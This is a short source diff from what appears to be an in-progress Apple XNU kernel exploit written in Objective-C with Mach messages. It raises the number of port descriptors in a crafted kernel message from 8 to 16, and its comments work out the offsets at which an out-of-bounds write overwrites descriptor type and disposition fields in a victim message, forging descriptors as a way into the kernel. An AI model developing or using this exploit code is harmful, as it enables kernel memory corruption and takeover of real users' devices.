@@ -46,7 +46,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P073_BUILD @"p073-second-table-v7f-allport-desc"
+#define P073_BUILD @"p073-second-table-v7g-desc16"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -264,7 +264,13 @@ static BOOL p073_send_simple(mach_port_t port, uint32_t index) {
    band, i.e. body+0..0x40 — exactly the desc region (body+0x04..0x64). The
    spilled record bytes = forged descriptor dispositions/types in kernel
    memory; the recv-side processing of those descs is the conversion door. */
-#define P073_N_DESC (8u)
+/* v7g: 16 descs. The OOB record stream lands at victim body+0x64 (21:44/22:09
+   law: an 8-desc port-kind kmsg ends its desc block exactly at 0x64 =
+   0x20 hdr + 4 body + 8x12 descs — the landing starts AT the boundary, zero
+   overlay, descForged=0 by arithmetic). 16 descs extend the block to 0xC4:
+   records landing 0x64..0xC4 overwrite descs 6..15 incl. their {type@8,
+   disposition@10} words = the v49 desc door. */
+#define P073_N_DESC (16u)
 #define P073_PORT_BODY_OFF (sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t))
 
 static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
@@ -279,7 +285,7 @@ static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
        validator rejects it (tonight's mr=0x1000000f INVALID_TRAILER x64) —
        and each desc carries a FRESH port right (own refs, released post-send
        like p044) instead of a COPY_SEND of the dest port itself. */
-    mach_port_t dp[8];
+    mach_port_t dp[P073_N_DESC];
     for (uint32_t i = 0; i < P073_N_DESC; i++) {
         mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)
             (buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + i * sizeof(mach_msg_port_descriptor_t));
